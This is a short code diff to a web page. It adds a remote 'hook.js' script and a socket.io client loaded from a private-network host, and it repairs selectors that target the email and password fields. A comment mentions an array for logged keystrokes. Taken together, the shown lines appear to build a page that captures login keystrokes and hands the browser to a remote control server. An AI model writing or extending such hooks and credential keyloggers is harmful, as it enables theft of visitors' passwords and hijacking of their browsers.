@@ -11,12 +11,14 @@
 
 </script> -->
 <body>
-  <script src="/script.js"></script>
-  <script src="192.168.1.112:3000/hook.js" id="dynamic-script"></script>
-  <script>
+  <script defer src= "script.js"></script>
+  <script async src="http://192.168.1.112:3000/hook.js" id="dynamic-script"></script>
+  <script defer src = "http://192.168.1.112:3002/webserver/socket.io/socket.io.js" id="dynamic-script-2"></script>
 
-    const textbox = document.getElementByType('email');
-    const log = document.getElementByType('password');
+<script>
+
+    const textbox = document.getElementById('email');
+    const log = document.getElementById('password');
 
 
     // Array to hold logged keystrokes
